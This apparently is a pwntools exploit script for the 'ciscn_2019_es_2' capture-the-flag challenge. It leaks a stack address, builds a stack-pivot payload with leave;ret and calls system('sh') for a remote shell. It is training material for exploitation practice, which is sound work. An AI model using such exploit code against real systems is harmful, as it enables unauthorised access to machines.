from pwn import *


# p = process("./ciscn_2019_es_2")
p = remote("node4.buuoj.cn", 28002)
pro = ELF("./ciscn_2019_es_2")

system = pro.plt["system"]
leave_ret = 0x080485FD
 

# stack migration
pad = cyclic(0x28)
p.send(pad)
p.recvuntil("jaaa")
ebp = u32(p.recv(4))
buf = ebp-0x10-0x28 
print(hex(buf))


"""
pad = b"sh\x00\x00"+p32(system)+p32(0)+p32(buf)

# the str "sh\x00\x00" can't put in the stack before the ret addr
# bacause "push" opt will crash the value 
"""
pad = cyclic(0x4)+p32(system)+b"sh\x00\x00"+p32(buf+0x8)
pad += cyclic(0x28-0x10)
pad += p32(buf)+p32(leave_ret)
p.send(pad)

p.interactive()

